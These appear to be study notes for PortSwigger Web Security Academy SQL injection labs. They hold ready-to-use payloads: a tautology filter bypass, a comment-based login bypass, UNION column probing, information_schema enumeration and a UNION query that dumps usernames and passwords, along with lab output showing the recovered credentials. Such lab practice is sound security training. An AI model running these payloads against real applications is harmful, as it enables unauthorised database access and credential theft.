### init
`' or 1=1-- -`

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
SELECT * FROM products WHERE category = 'Gifts' or 1=1-- - AND released = 1

```
### bypass
```sql
SELECT NAME, SURNAME FROM USERS WHERE NAME = '%S' AND PASSWORD = '%S';
SELECT NAME, SURNAME FROM USERS WHERE NAME = 'administrator' AND PASSWORD = '%s';
SELECT NAME, SURNAME FROM USERS WHERE NAME = 'administrator'-- -' AND PASSWORD = '%s'; 

```

## UNION attack for numerb of columns
```sql
SELECT PASSWORD, SUBSCRIPTION FROM USERS WHERE NAME = 'txhaka';
SELECT PASSWORD, SUBSCRIPTION FROM USERS WHERE NAME = 'txhaka' ORDER BY 3;-- -';

-- url
https://0a8e00880405bdf2806e8a22009400cf.web-security-academy.net/filter?category=Gifts%27%20order%20by%206--%20-
https://0a8e00880405bdf2806e8a22009400cf.web-security-academy.net/filter?category=Gifts%27%20order%20by%205--%20-
https://0a8e00880405bdf2806e8a22009400cf.web-security-academy.net/filter?category=Gifts%27%20order%20by%205--%20-
https://0a8e00880405bdf2806e8a22009400cf.web-security-academy.net/filter?category=Gifts%27%20order%20by%203--%20- [check]

SELECT PASSWORD,SUBSCRIPTION FROM USERS WHERE USERNAME = 'txhaka';
SELECT PASSWORD,SUBSCRIPTION FROM USERS WHERE USERNAME = 'txhaka' UNION SELECT 1,2;-- -';

SELECT PASSWORD,SUBSCRIPTION FROM USERS WHERE USERNAME = 'txhaka' UNION SELECT version(),2;-- -';
SELECT PASSWORD,SUBSCRIPTION FROM USERS WHERE USERNAME = 'txhaka' UNION SELECT version(),database();-- -';
SELECT PASSWORD,SUBSCRIPTION FROM USERS WHERE USERNAME = 'txhaka' UNION SELECT version(),user();-- -';

https://0a8e00880405bdf2806e8a22009400cf.web-security-academy.net/filter?category=Gifts%27%20union%20select%20null,null,null--%20-

```

### UNION attack, finding a columns with text
```sql
https://0a5a00a804e09cca81ca52d2001b0081.web-security-academy.net/filter?category=Pets%27%20union%20select%20null,%27p9AAz9%27,null--%20-

```

### UNION attack, get data from other tables
```sql
SELECT PASSWORD,SUBSCRIPTION FROM USERS WHERE USERNAME = 'txhaka' UNION SELECT 1,group_concat(schema_name) from information_schema.schemata;-- -';

SELECT PASSWORD,SUBSCRIPTION FROM USERS WHERE USERNAME = 'txhaka' UNION SELECT 1,schema_name from information_schema.schemata limit 1,1;-- -';
SELECT PASSWORD,SUBSCRIPTION FROM USERS WHERE USERNAME = 'txhaka' UNION SELECT 1,schema_name from information_schema.schemata limit 2,1;-- -';
SELECT PASSWORD,SUBSCRIPTION FROM USERS WHERE USERNAME = 'txhaka' UNION SELECT 1,schema_name from information_schema.schemata limit 3,1;-- -';

--URL
https://0af900500437e0c2838541bb00ec0095.web-security-academy.net/filter?category=Tech+gifts%27%20union%20select%20%27test%27,null--%20-
https://0af900500437e0c2838541bb00ec0095.web-security-academy.net/filter?category=Tech+gifts%27%20union%20select%20null,null--%20-

https://0af900500437e0c2838541bb00ec0095.web-security-academy.net/filter?category=Tech+gifts%27%20union%20select%20schema_name,null%20from%20information_schema.schemata--%20-

-- ans
pg_catalog
public
information_schema

-- table enumerating
SELECT PASSWORD,SUBSCRIPTION FROM USERS WHERE USERNAME = 'txhaka' UNION SELECT 1,table_name from information_schema.tables;
SELECT PASSWORD,SUBSCRIPTION FROM USERS WHERE USERNAME = 'txhaka' UNION SELECT 1,table_name from information_schema.tables where table_schema = 'TWITCH';

https://0af900500437e0c2838541bb00ec0095.web-security-academy.net/filter?category=Tech+gifts%27%20union%20select%20table_name,null%20from%20information_schema.tables%20where%20table_schema=%27public%27--%20-

```
![alt text](image.png)

```sql
SELECT PASSWORD,SUBSCRIPTION FROM USERS WHERE USERNAME = 'txhaka' UNION SELECT 1,column_name from information_schema.columns where table_schema = 'TWITCH' and table_name = 'USERS';

-- URL
https://0af900500437e0c2838541bb00ec0095.web-security-academy.net/filter?category=Tech+gifts%27%20union%20select%20null,column_name%20from%20information_schema.columns%20where%20table_schema=%27public%27%20and%20table_name=%27users%27--%20-

-- ans
email
password
username

SELECT PASSWORD,SUBSCRIPTION FROM USERS WHERE USERNAME = 'txhaka' UNION SELECT 1,group_concat(username,':',password) from USERS;
https://0af900500437e0c2838541bb00ec0095.web-security-academy.net/filter?category=Tech+gifts%27%20union%20select%20username,password%20from%20users--%20-

-- ans
administrator
jphtg83r1wa9cgem7w02

wiener
hpxozn1pixzd1gkxutpz

carlos
7z1dcvmr96r9mi80jfwy

```

### UNION attack, multiple values in one column
```sql
https://0a2a009a03484aa780d32120009e00f0.web-security-academy.net/filter?category=Pets%27%20union%20select%20null,username||%27:%27||password%20from%20users--%20-

-- ans
administrator:8azul9w80ngjg6rnl2f1
carlos:xhi6gz6bfipv5le1o6mv
wiener:aqvwn38vie9226y962fn


```